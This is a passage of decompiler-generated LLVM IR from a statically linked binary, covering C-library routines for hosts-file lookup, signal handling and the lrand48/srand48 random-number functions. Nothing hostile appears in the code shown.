dec_label_pc_196fc.preheader:                     ; preds = %dec_label_pc_196e8, %dec_label_pc_196d4, %dec_label_pc_196c4, %dec_label_pc_196b4
  %v0_196fc20 = phi i32 [ %v0_196c815, %dec_label_pc_196b4 ], [ %v0_196c4, %dec_label_pc_196e8 ], [ %v0_196c4, %dec_label_pc_196d4 ], [ %v1_196c4, %dec_label_pc_196c4 ]
  %v1_196fc21 = inttoptr i32 %v0_196fc20 to i8*
  %v2_196fc22 = load i8, i8* %v1_196fc21, align 1
  %v3_196fc23 = zext i8 %v2_196fc22 to i32
  store i32 %v3_196fc23, i32* %r2.global-to-local, align 4
  %v2_1970024 = icmp eq i8 %v2_196fc22, 0
  br i1 %v2_1970024, label %dec_label_pc_19724, label %dec_label_pc_19708

dec_label_pc_196f4:                               ; preds = %dec_label_pc_19708, %dec_label_pc_1971c
  %v3_196f8 = inttoptr i32 %v2_196f8 to i8*
  store i8 0, i8* %v3_196f8, align 1
  %v4_196f8 = load i32, i32* %r0.global-to-local, align 4
  %v5_196f8 = add i32 %v4_196f8, 1
  store i32 %v5_196f8, i32* %r0.global-to-local, align 4
  %v1_196fc = inttoptr i32 %v5_196f8 to i8*
  %v2_196fc = load i8, i8* %v1_196fc, align 1
  %v3_196fc = zext i8 %v2_196fc to i32
  store i32 %v3_196fc, i32* %r2.global-to-local, align 4
  %v2_19700 = icmp eq i8 %v2_196fc, 0
  br i1 %v2_19700, label %dec_label_pc_19724, label %dec_label_pc_19708

dec_label_pc_19708:                               ; preds = %dec_label_pc_196fc.preheader, %dec_label_pc_196f4
  %v0_1971c = phi i32 [ %v3_196fc, %dec_label_pc_196f4 ], [ %v3_196fc23, %dec_label_pc_196fc.preheader ]
  %v2_196f8 = phi i32 [ %v5_196f8, %dec_label_pc_196f4 ], [ %v0_196fc20, %dec_label_pc_196fc.preheader ]
  %v2_1970c = load i32, i32* @global_var_2b898, align 4
  %v3_19710 = mul nuw nsw i32 %v0_1971c, 2
  %v4_19710 = add i32 %v2_1970c, %v3_19710
  %v5_19710 = inttoptr i32 %v4_19710 to i8*
  %v6_19710 = load i8, i8* %v5_19710, align 1
  %v1_19714 = and i8 %v6_19710, 32
  %v2_19714 = icmp eq i8 %v1_19714, 0
  br i1 %v2_19714, label %dec_label_pc_1971c, label %dec_label_pc_196f4

dec_label_pc_1971c:                               ; preds = %dec_label_pc_19708
  %v7_1971c = icmp eq i32 %v0_1971c, 10
  br i1 %v7_1971c, label %dec_label_pc_196f4, label %dec_label_pc_19724

dec_label_pc_19724:                               ; preds = %dec_label_pc_196f4, %dec_label_pc_1971c, %dec_label_pc_196fc.preheader
  %v0_1972834 = phi i32 [ %v0_196fc20, %dec_label_pc_196fc.preheader ], [ %v5_196f8, %dec_label_pc_196f4 ], [ %v2_196f8, %dec_label_pc_1971c ]
  %v0_19724 = load i32, i32* @r8, align 4
  %v1_19724 = add i32 %v0_19724, 1
  br label %dec_label_pc_19728

dec_label_pc_19728:                               ; preds = %dec_label_pc_196a4, %dec_label_pc_19724
  %storemerge = phi i32 [ %v1_19724, %dec_label_pc_19724 ], [ 0, %dec_label_pc_196a4 ]
  %v0_196bc = phi i32 [ %v0_1972834, %dec_label_pc_19724 ], [ %v0_1972835, %dec_label_pc_196a4 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_19728 = inttoptr i32 %v0_196bc to i8*
  %v2_19728 = load i8, i8* %v1_19728, align 1
  %v3_19728 = zext i8 %v2_19728 to i32
  %v2_1972c = icmp eq i8 %v2_19728, 0
  br i1 %v2_1972c, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_19728
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_19728, %bb56
  %v0_1973c.pr = phi i32 [ %v3_19728, %dec_label_pc_19728 ], [ 1, %bb56 ]
  %v1_19734 = add i32 %storemerge, -4
  %v3_19734 = sub i32 3, %storemerge
  %v4_19734 = and i32 %v3_19734, %storemerge
  %v5_19734 = icmp slt i32 %v4_19734, 0
  %v6_19734 = icmp slt i32 %v1_19734, 0
  %v7_19734 = icmp eq i32 %storemerge, 4
  %v3_19738 = xor i1 %v6_19734, %v5_19734
  %v4_19738 = or i1 %v7_19734, %v3_19738
  br i1 %v4_19738, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_19744

bb58:                                             ; preds = %bb57
  %v2_1973c = icmp eq i32 %v0_1973c.pr, 0
  br i1 %v2_1973c, label %dec_label_pc_19744, label %dec_label_pc_196b4

dec_label_pc_19744:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1ea04.958 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_19750 = call i32 @__GI_strcoll(i8* %v3_19750, i32 ptrtoint ([11 x i8]* @global_var_1ea04.958 to i32))
  store i32 %v4_19750, i32* %r0.global-to-local, align 4
  %v2_19754 = icmp eq i32 %v4_19750, 0
  br i1 %v2_19754, label %dec_label_pc_1977c.preheader, label %dec_label_pc_197a0

dec_label_pc_1977c.preheader:                     ; preds = %dec_label_pc_19744
  br label %dec_label_pc_1977c

dec_label_pc_19764:                               ; preds = %dec_label_pc_19794
  %v1_19764 = add i32 %v5_19784, -36
  %v2_19764 = inttoptr i32 %v1_19764 to i32*
  %v3_19764 = load i32, i32* %v2_19764, align 4
  store i32 %v3_19764, i32* %r0.global-to-local, align 4
  %v1_19768 = inttoptr i32 %v3_19764 to i8*
  %v2_19768 = call i32 @__GI_strdup(i8* %v1_19768)
  store i32 %v2_19768, i32* %r0.global-to-local, align 4
  %v0_19770 = load i32, i32* @r4, align 4
  %v1_19770 = add i32 %v0_19770, 1
  store i32 %v1_19770, i32* %r2.global-to-local, align 4
  %v5_19774 = mul i32 %v0_19770, 4
  %v6_19774 = add i32 %v5_19774, ptrtoint (i32* @global_var_30324.684 to i32)
  %v7_19774 = inttoptr i32 %v6_19774 to i32*
  store i32 %v2_19768, i32* %v7_19774, align 4
  %v0_19778 = load i32, i32* %r2.global-to-local, align 4
  %v1_19778 = load i32, i32* @r7, align 4
  %v2_19778 = inttoptr i32 %v1_19778 to i32*
  store i32 %v0_19778, i32* %v2_19778, align 4
  %v0_19780.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1977c

dec_label_pc_1977c:                               ; preds = %dec_label_pc_1977c.preheader, %dec_label_pc_19764
  %v0_1978c = phi i32 [ 1, %dec_label_pc_1977c.preheader ], [ %v0_19780.pre, %dec_label_pc_19764 ]
  store i32 %v2_196b4, i32* %r2.global-to-local, align 4
  %v1_19780 = load i32, i32* @r8, align 4
  %v2_19780 = sub i32 %v0_1978c, %v1_19780
  %v4_19780 = xor i32 %v1_19780, %v0_1978c
  %v5_19780 = xor i32 %v2_19780, %v0_1978c
  %v6_19780 = and i32 %v5_19780, %v4_19780
  %v7_19780 = icmp slt i32 %v6_19780, 0
  %v8_19780 = icmp slt i32 %v2_19780, 0
  %v4_19784 = mul i32 %v0_1978c, 4
  %v5_19784 = add i32 %v4_19784, %v2_196b4
  store i32 ptrtoint (i32* @global_var_30330.681 to i32), i32* @r7, align 4
  %v1_1978c = add i32 %v0_1978c, 1
  store i32 %v1_1978c, i32* @r5, align 4
  %v2_19790 = xor i1 %v8_19780, %v7_19780
  br i1 %v2_19790, label %dec_label_pc_19794, label %dec_label_pc_197a0

dec_label_pc_19794:                               ; preds = %dec_label_pc_1977c
  %v2_19794 = load i32, i32* @global_var_30330.681, align 4
  store i32 %v2_19794, i32* @r4, align 4
  %v7_1979c = icmp slt i32 %v2_19794, 3
  br i1 %v7_1979c, label %dec_label_pc_19764, label %dec_label_pc_197a0

dec_label_pc_197a0:                               ; preds = %dec_label_pc_1977c, %dec_label_pc_19794, %dec_label_pc_19744
  %v0_197a0 = load i32, i32* @r6, align 4
  store i32 %v0_197a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1ea10.961 to i32), i32* @r1, align 4
  %v3_197a8 = inttoptr i32 %v0_197a0 to i8*
  %v4_197a8 = call i32 @__GI_strcoll(i8* %v3_197a8, i32 ptrtoint ([7 x i8]* @global_var_1ea10.961 to i32))
  store i32 %v4_197a8, i32* %r0.global-to-local, align 4
  %v2_197ac = icmp eq i32 %v4_197a8, 0
  br i1 %v2_197ac, label %dec_label_pc_197e4.preheader, label %dec_label_pc_197b4

dec_label_pc_197b4:                               ; preds = %dec_label_pc_197a0
  %v0_197b4 = load i32, i32* @r6, align 4
  store i32 %v0_197b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1ea18.963 to i32), i32* @r1, align 4
  %v3_197bc = inttoptr i32 %v0_197b4 to i8*
  %v4_197bc = call i32 @__GI_strcoll(i8* %v3_197bc, i32 ptrtoint ([7 x i8]* @global_var_1ea18.963 to i32))
  store i32 %v4_197bc, i32* %r0.global-to-local, align 4
  %v2_197c0 = icmp eq i32 %v4_197bc, 0
  br i1 %v2_197c0, label %dec_label_pc_197e4.preheader, label %dec_label_pc_19840.backedge

dec_label_pc_197e4.preheader:                     ; preds = %dec_label_pc_197a0, %dec_label_pc_197b4
  store i32 ptrtoint (i32* @global_var_30334.938 to i32), i32* @r4, align 4
  %v2_197e860 = load i32, i32* @global_var_30334.938, align 4
  store i32 ptrtoint (i32* @global_var_30314.942 to i32), i32* @r5, align 4
  %v1_197f463 = add i32 %v2_197e860, -1
  store i32 %v1_197f463, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_197e860, 1
  br i1 %tmp5964, label %dec_label_pc_197fc, label %dec_label_pc_197cc

dec_label_pc_197cc:                               ; preds = %dec_label_pc_197e4.preheader, %dec_label_pc_197cc
  %v1_197f465 = phi i32 [ %v1_197f4, %dec_label_pc_197cc ], [ %v1_197f463, %dec_label_pc_197e4.preheader ]
  %v4_197cc = mul i32 %v1_197f465, 4
  %v5_197cc = add i32 %v4_197cc, ptrtoint (i32* @global_var_30314.942 to i32)
  %v6_197cc = inttoptr i32 %v5_197cc to i32*
  %v7_197cc = load i32, i32* %v6_197cc, align 4
  store i32 %v7_197cc, i32* @r0, align 4
  store i32 %v1_197f465, i32* @global_var_30334.938, align 4
  %v0_197d4 = call i32 @free()
  store i32 %v0_197d4, i32* %r0.global-to-local, align 4
  %v0_197d8 = load i32, i32* @r4, align 4
  %v1_197d8 = inttoptr i32 %v0_197d8 to i32*
  %v2_197d8 = load i32, i32* %v1_197d8, align 4
  %v1_197e0 = load i32, i32* @r5, align 4
  %v5_197e0 = mul i32 %v2_197d8, 4
  %v6_197e0 = add i32 %v1_197e0, %v5_197e0
  %v7_197e0 = inttoptr i32 %v6_197e0 to i32*
  store i32 0, i32* %v7_197e0, align 4
  store i32 ptrtoint (i32* @global_var_30334.938 to i32), i32* @r4, align 4
  %v2_197e8 = load i32, i32* @global_var_30334.938, align 4
  store i32 ptrtoint (i32* @global_var_30314.942 to i32), i32* @r5, align 4
  %v1_197f4 = add i32 %v2_197e8, -1
  store i32 %v1_197f4, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_197e8, 1
  br i1 %tmp59, label %dec_label_pc_197fc, label %dec_label_pc_197cc

dec_label_pc_197fc:                               ; preds = %dec_label_pc_197cc, %dec_label_pc_197e4.preheader
  br label %dec_label_pc_1981c

dec_label_pc_19804:                               ; preds = %dec_label_pc_19834
  %v1_19804 = add i32 %v5_19824, -36
  %v2_19804 = inttoptr i32 %v1_19804 to i32*
  %v3_19804 = load i32, i32* %v2_19804, align 4
  store i32 %v3_19804, i32* %r0.global-to-local, align 4
  %v1_19808 = inttoptr i32 %v3_19804 to i8*
  %v2_19808 = call i32 @__GI_strdup(i8* %v1_19808)
  store i32 %v2_19808, i32* %r0.global-to-local, align 4
  %v0_19810 = load i32, i32* @r4, align 4
  %v1_19810 = add i32 %v0_19810, 1
  store i32 %v1_19810, i32* %r2.global-to-local, align 4
  %v5_19814 = mul i32 %v0_19810, 4
  %v6_19814 = add i32 %v5_19814, ptrtoint (i32* @global_var_30314.942 to i32)
  %v7_19814 = inttoptr i32 %v6_19814 to i32*
  store i32 %v2_19808, i32* %v7_19814, align 4
  %v0_19818 = load i32, i32* %r2.global-to-local, align 4
  %v1_19818 = load i32, i32* @r6, align 4
  %v2_19818 = inttoptr i32 %v1_19818 to i32*
  store i32 %v0_19818, i32* %v2_19818, align 4
  %v0_19820.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1981c

dec_label_pc_1981c:                               ; preds = %dec_label_pc_197fc, %dec_label_pc_19804
  %v0_1982c = phi i32 [ 1, %dec_label_pc_197fc ], [ %v0_19820.pre, %dec_label_pc_19804 ]
  store i32 %v2_196b4, i32* %r2.global-to-local, align 4
  %v1_19820 = load i32, i32* @r8, align 4
  %v2_19820 = sub i32 %v0_1982c, %v1_19820
  %v4_19820 = xor i32 %v1_19820, %v0_1982c
  %v5_19820 = xor i32 %v2_19820, %v0_1982c
  %v6_19820 = and i32 %v5_19820, %v4_19820
  %v7_19820 = icmp slt i32 %v6_19820, 0
  %v8_19820 = icmp slt i32 %v2_19820, 0
  %v4_19824 = mul i32 %v0_1982c, 4
  %v5_19824 = add i32 %v4_19824, %v2_196b4
  store i32 ptrtoint (i32* @global_var_30334.938 to i32), i32* @r6, align 4
  %v1_1982c = add i32 %v0_1982c, 1
  store i32 %v1_1982c, i32* @r5, align 4
  %v2_19830 = xor i1 %v8_19820, %v7_19820
  br i1 %v2_19830, label %dec_label_pc_19834, label %dec_label_pc_19840.backedge

dec_label_pc_19834:                               ; preds = %dec_label_pc_1981c
  %v2_19834 = load i32, i32* @global_var_30334.938, align 4
  store i32 %v2_19834, i32* @r4, align 4
  %v7_1983c = icmp slt i32 %v2_19834, 4
  br i1 %v7_1983c, label %dec_label_pc_19804, label %dec_label_pc_19840.backedge

dec_label_pc_19670.preheader:                     ; preds = %dec_label_pc_19670.preheader.lr.ph, %dec_label_pc_19840.backedge
  store i32 %v2_19604, i32* %r0.global-to-local, align 4
  %v2_1967012 = load i8, i8* %v1_1967011, align 4
  %v3_1967013 = zext i8 %v2_1967012 to i32
  store i32 %v3_1967013, i32* %r2.global-to-local, align 4
  %v2_1967414 = icmp eq i8 %v2_1967012, 0
  br i1 %v2_1967414, label %dec_label_pc_19690, label %dec_label_pc_1967c.lr.ph

dec_label_pc_1967c.lr.ph:                         ; preds = %dec_label_pc_19670.preheader
  %v2_19680.pre = load i32, i32* @global_var_2b898, align 4
  br label %dec_label_pc_1967c

dec_label_pc_19860:                               ; preds = %dec_label_pc_19840.backedge, %dec_label_pc_19840.preheader
  %v0_19860 = load i32, i32* @sl, align 4
  store i32 %v0_19860, i32* %r0.global-to-local, align 4
  %v1_19864 = inttoptr i32 %v0_19860 to i8*
  %v2_19864 = call i32 @__GI_fclose(i8* %v1_19864)
  store i32 %v2_19864, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19878

dec_label_pc_1986c:                               ; preds = %dec_label_pc_19654
  %v0_1986c = call i32 @__GI___h_errno_location()
  store i32 %v0_1986c, i32* %r0.global-to-local, align 4
  %v2_19874 = inttoptr i32 %v0_1986c to i32*
  store i32 3, i32* %v2_19874, align 4
  br label %dec_label_pc_19878

dec_label_pc_19878:                               ; preds = %entry, %dec_label_pc_19860, %dec_label_pc_1986c
  store i32 %v2_19608, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 104588, i32* @lr, align 4
  %v1_19888 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_19888, i32* %r0.global-to-local, align 4
  %v2_19890 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_19890, i32* @r4, align 4
  store i32 %v6_19600, i32* @r5, align 4
  store i32 %v9_19600, i32* @r6, align 4
  store i32 %v12_19600, i32* @r7, align 4
  store i32 %v15_19600, i32* @r8, align 4
  store i32 %v18_19600, i32* @sl, align 4
  ret i32 %v1_19888

; uselistorder directives
  uselistorder i32 %v3_1967013, { 2, 1, 0 }
  uselistorder i32 %v2_19820, { 1, 0 }
  uselistorder i32 %v0_1982c, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_197f4, { 1, 0 }
  uselistorder i32 %v1_197f465, { 1, 0 }
  uselistorder i32 %v2_19780, { 1, 0 }
  uselistorder i32 %v0_1978c, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_196bc, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_196fc20, { 1, 0, 2 }
  uselistorder i32 %v2_196b4, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_19604, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 5, 3, 4, 6, 2, 9, 7, 8, 10, 16, 11, 1, 12, 14, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 20, 6, 5, 7, 9, 8, 11, 10, 13, 12, 21, 14, 15, 19, 16, 18, 23, 22, 17, 0, 24, 25, 28, 26, 27 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_30314.942 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_30334.938, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_30334.938 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_30324.684 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11, 17, 16, 15, 18, 19 }
  uselistorder i32* @global_var_30330.681, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_2b8c0.676 to i32), { 0, 5, 6, 1, 7, 2, 8, 3, 9, 4, 10, 11 }
  uselistorder label %dec_label_pc_19878, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19670.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1981c, { 1, 0 }
  uselistorder label %dec_label_pc_197cc, { 1, 0 }
  uselistorder label %dec_label_pc_197e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_197a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1977c, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_19728, { 1, 0 }
  uselistorder label %dec_label_pc_19724, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19708, { 1, 0 }
  uselistorder label %dec_label_pc_196f4, { 1, 0 }
  uselistorder label %dec_label_pc_196d4, { 1, 0 }
  uselistorder label %dec_label_pc_19840.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_19690, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19840.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_19910 = call i32 @__read_etc_hosts_r()
  ret i32 %v0_19910
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1991c = load i32, i32* @r4, align 4
  store i32 %v3_1991c, i32* %stack_var_-12, align 4
  %v6_1991c = load i32, i32* @r5, align 4
  %v10_1991c = ptrtoint i32* %stack_var_-12 to i32
  %v7_19920 = icmp eq i32 %arg2, -1
  %v0_1992c.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_19920, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_19944

bb:                                               ; preds = %entry
  %v2_19928 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_1992c.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_1992c.pre, 1
  br i1 %tmp19, label %dec_label_pc_19944, label %dec_label_pc_19934

dec_label_pc_19934:                               ; preds = %bb
  %v7_19938 = icmp sgt i32 %v0_1992c.pre, 64
  br i1 %v7_19938, label %dec_label_pc_19944, label %bb20

bb20:                                             ; preds = %dec_label_pc_19934
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1996824 = add i32 %v10_1991c, 124
  store i32 %v5_1996824, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19958

dec_label_pc_19944:                               ; preds = %.thread, %dec_label_pc_19934, %bb
  %v0_19944 = call i32 @__errno_location()
  store i32 %v0_19944, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19950 = inttoptr i32 %v0_19944 to i32*
  store i32 22, i32* %v2_19950, align 4
  %v0_199c4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_199c4

dec_label_pc_19958:                               ; preds = %bb20, %dec_label_pc_19958
  %v5_1996825 = phi i32 [ %v5_1996824, %bb20 ], [ %v5_19968, %dec_label_pc_19958 ]
  %v2_1995c = add i32 %v5_1996825, -136
  %v3_1995c = inttoptr i32 %v2_1995c to i32*
  store i32 0, i32* %v3_1995c, align 4
  %v0_19960.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_19960 = add i32 %v0_19960.pre, -1
  store i32 %v1_19960, i32* %r0.global-to-local, align 4
  %v6_19960 = icmp slt i32 %v1_19960, 0
  %v4_19968 = mul i32 %v1_19960, 4
  %v5_19968 = add i32 %v4_19968, %v10_1991c
  store i32 %v5_19968, i32* %r2.global-to-local, align 4
  br i1 %v6_19960, label %dec_label_pc_19970, label %dec_label_pc_19958

dec_label_pc_19970:                               ; preds = %dec_label_pc_19958
  %v2_19970 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_19970, i32* @r5, align 4
  %v2_19974 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_19974, i32* @r0, align 4
  %v0_19978 = load i32, i32* @r4, align 4
  store i32 %v0_19978, i32* @r1, align 4
  %v0_1997c = call i32 @__sigaddset()
  store i32 %v0_1997c, i32* %r0.global-to-local, align 4
  %v1_19980 = icmp slt i32 %v0_1997c, 0
  br i1 %v1_19980, label %dec_label_pc_199c0, label %dec_label_pc_19988

dec_label_pc_19988:                               ; preds = %dec_label_pc_19970
  %v0_19988 = load i32, i32* @r4, align 4
  store i32 %v0_19988, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_30338.968 to i32), i32* @r0, align 4
  %v0_19990 = call i32 @__sigismember()
  store i32 %v2_19928, i32* %r2.global-to-local, align 4
  %v0_199a8 = load i32, i32* @r4, align 4
  store i32 %v0_199a8, i32* %r0.global-to-local, align 4
  %v4_199b0 = call i32 @__GI_sigaction(i32 %v0_199a8, i32* nonnull %stack_var_-152, i32 %v2_19928)
  store i32 %v4_199b0, i32* %r0.global-to-local, align 4
  %v1_199b4 = icmp slt i32 %v4_199b0, 0
  br i1 %v1_199b4, label %dec_label_pc_199c0, label %bb23

bb23:                                             ; preds = %dec_label_pc_19988
  %v5_199b8 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_199b8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_199c4

dec_label_pc_199c0:                               ; preds = %dec_label_pc_19988, %dec_label_pc_19970
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_199c4

dec_label_pc_199c4:                               ; preds = %bb23, %dec_label_pc_19944, %dec_label_pc_199c0
  %v0_199c4 = phi i32 [ %v5_199b8, %bb23 ], [ %v0_199c4.pre, %dec_label_pc_19944 ], [ -1, %dec_label_pc_199c0 ]
  store i32 %v0_199c4, i32* %r0.global-to-local, align 4
  %v2_199cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_199cc, i32* @r4, align 4
  store i32 %v6_1991c, i32* @r5, align 4
  ret i32 %v0_199c4

; uselistorder directives
  uselistorder i32 %v0_199c4, { 1, 0 }
  uselistorder i32 %v5_19968, { 1, 0 }
  uselistorder i32 %v1_19960, { 0, 2, 1 }
  uselistorder i32 %v2_19928, { 1, 0 }
  uselistorder i32 %v0_1992c.pre, { 1, 0, 2 }
  uselistorder i32 %v10_1991c, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 8, 7, 6, 9, 2, 0, 1 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 0, 2, 3, 1 }
  uselistorder i32 ()* @__sigismember, { 1, 0, 2 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_199c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19958, { 1, 0 }
  uselistorder label %dec_label_pc_19944, { 1, 2, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_199dc = call i32 @nrand48_r()
  ret i32 %v0_199dc
}

define i32 @nrand48_r() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_199e0 = load i32, i32* @r4, align 4
  store i32 %v3_199e0, i32* %stack_var_-12, align 4
  %v6_199e0 = load i32, i32* @r5, align 4
  %v0_199e4 = load i32, i32* @r2, align 4
  store i32 %v0_199e4, i32* @r5, align 4
  %v0_199e8 = load i32, i32* @r0, align 4
  store i32 %v0_199e8, i32* @r4, align 4
  %v0_199ec = call i32 @__drand48_iterate()
  %v1_199f0 = icmp slt i32 %v0_199ec, 0
  br i1 %v1_199f0, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v5_199f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_199f8, i32* @r4, align 4
  store i32 %v6_199e0, i32* @r5, align 4
  ret i32 -1

bb4:                                              ; preds = %entry
  %v0_199fc = load i32, i32* @r4, align 4
  %v1_199fc = add i32 %v0_199fc, 3
  %v2_199fc = inttoptr i32 %v1_199fc to i8*
  %v3_199fc = load i8, i8* %v2_199fc, align 1
  %v4_199fc = zext i8 %v3_199fc to i32
  %v1_19a00 = add i32 %v0_199fc, 2
  %v2_19a00 = inttoptr i32 %v1_19a00 to i8*
  %v3_19a00 = load i8, i8* %v2_19a00, align 1
  %v4_19a00 = zext i8 %v3_19a00 to i32
  %v1_19a04 = add i32 %v0_199fc, 4
  %v2_19a04 = inttoptr i32 %v1_19a04 to i8*
  %v3_19a04 = load i8, i8* %v2_19a04, align 1
  %v4_19a04 = zext i8 %v3_19a04 to i32
  %v1_19a08 = add i32 %v0_199fc, 5
  %v2_19a08 = inttoptr i32 %v1_19a08 to i8*
  %v3_19a08 = load i8, i8* %v2_19a08, align 1
  %v4_19a08 = zext i8 %v3_19a08 to i32
  %v4_19a0c = mul nuw nsw i32 %v4_199fc, 256
  %v5_19a0c = or i32 %v4_19a00, %v4_19a0c
  %v4_19a10 = mul nuw nsw i32 %v4_19a08, 256
  %v5_19a10 = or i32 %v4_19a10, %v4_19a04
  %v3_19a14 = udiv i32 %v5_19a0c, 2
  %v4_19a18 = mul nuw i32 %v5_19a10, 32768
  %v5_19a18 = or i32 %v4_19a18, %v3_19a14
  %v1_19a20 = load i32, i32* @r5, align 4
  %v2_19a20 = inttoptr i32 %v1_19a20 to i32*
  store i32 %v5_19a18, i32* %v2_19a20, align 4
  %v2_19a24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19a24, i32* @r4, align 4
  store i32 %v6_199e0, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_199fc, { 1, 0, 2, 3 }
}

define i32 @__GI_srand48_r(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp2 = sext i8 %arg1 to i32
  %v4_19a281 = udiv i32 %tmp2, 65536
  %v1_19a2c = trunc i32 %v4_19a281 to i8
  %v4_19a2c = add i32 %arg2, 4
  %v5_19a2c = inttoptr i32 %v4_19a2c to i8*
  store i8 %v1_19a2c, i8* %v5_19a2c, align 1
  store i32 14, i32* %r3.global-to-local, align 4
  store i8 14, i8* %tmp, align 1
  %v0_19a3c = load i32, i32* %r3.global-to-local, align 4
  %v1_19a3c = add i32 %v0_19a3c, 37
  %v1_19a40 = trunc i32 %v1_19a3c to i8
  %v4_19a40 = add i32 %arg2, 1
  %v5_19a40 = inttoptr i32 %v4_19a40 to i8*
  store i8 %v1_19a40, i8* %v5_19a40, align 1
  %v4_19a48 = add i32 %arg2, 12
  %v5_19a48 = inttoptr i32 %v4_19a48 to i8*
  store i8 11, i8* %v5_19a48, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_19a54 = add i32 %arg2, 14
  %v5_19a54 = inttoptr i32 %v4_19a54 to i8*
